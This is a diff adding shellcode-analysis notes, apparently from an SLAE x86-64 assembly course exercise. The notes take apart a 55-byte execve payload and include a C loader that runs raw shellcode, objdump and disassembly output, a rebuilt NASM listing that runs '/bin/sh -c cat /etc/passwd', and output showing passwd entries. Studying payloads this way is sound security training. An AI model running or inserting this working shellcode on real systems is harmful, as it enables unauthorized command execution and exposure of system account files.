@@ -19,4 +19,99 @@ Payload size: 55 bytes
 Final size of elf file: 175 bytes
 Saved as: exec64
 
-======
+==
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
+"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x10\x00"
+"\x00\x00\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73"
+"\x77\x64\x00\x56\x57\x48\x89\xe6\x0f\x05";
+
+main()
+{
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+===
+root@kali:/opt/slae/shellcode_anlyz/exec_x64# objdump -s -j .data ./shellcode
+
+./shellcode:     file format elf64-x86-64
+
+Contents of section .data:
+ 201020 00000000 00000000 28102000 00000000  ........(. .....
+ 201030 00000000 00000000 00000000 00000000  ................
+ 201040 6a3b5899 48bb2f62 696e2f73 68005348  j;X.H./bin/sh.SH
+ 201050 89e7682d 63000048 89e652e8 10000000  ..h-c..H..R.....
+ 201060 63617420 2f657463 2f706173 73776400  cat /etc/passwd.
+ 201070 56574889 e60f0500                    VWH.....
+root@kali:/opt/slae/shellcode_anlyz/exec_x64#
+=====
+
+0000000000201040 <code>:
+  201040:       6a 3b                   push   0x3b
+  201042:       58                      pop    rax
+  201043:       99                      cdq
+  201044:       48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
+  20104b:       73 68 00
+  20104e:       53                      push   rbx
+  20104f:       48 89 e7                mov    rdi,rsp
+  201052:       68 2d 63 00 00          push   0x632d
+  201057:       48 89 e6                mov    rsi,rsp
+  20105a:       52                      push   rdx
+  20105b:       e8 10 00 00 00          call   201070 <code+0x30>
+  201060:       63 61 74                movsxd esp,DWORD PTR [rcx+0x74]
+  201063:       20 2f                   and    BYTE PTR [rdi],ch
+  201065:       65 74 63                gs je  2010cb <_end+0x4b>
+  201068:       2f                      (bad)
+  201069:       70 61                   jo     2010cc <_end+0x4c>
+  20106b:       73 73                   jae    2010e0 <_end+0x60>
+  20106d:       77 64                   ja     2010d3 <_end+0x53>
+  20106f:       00 56 57                add    BYTE PTR [rsi+0x57],dl
+  201072:       48 89 e6                mov    rsi,rsp
+  201075:       0f 05                   syscall
+
+
+================== Final working shellcode derived
+
+global _start
+
+section .text
+
+_start:
+
+                push 0x3b                       ; push 52 execve syscall
+                pop rax
+                cdq
+                mov rbx, 0x68732f6e69622f       ; mov /bin/sh to rbx
+
+                push rbx
+                mov rdi, rsp
+                push 0x632d                     ; -c
+                mov rsi, rsp
+                push rdx
+
+                call poppy
+                db 'cat /etc/passwd \n'
+
+poppy:
+                push rsi
+                push rdi
+                mov rsi, rsp                    ; command construct - /bin/sh -c "cat /etc/passwd \n"
+                syscall
+
+		
+====
+
+root@kali:/opt/slae/shellcode_anlyz/exec_x64# ./test
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+====
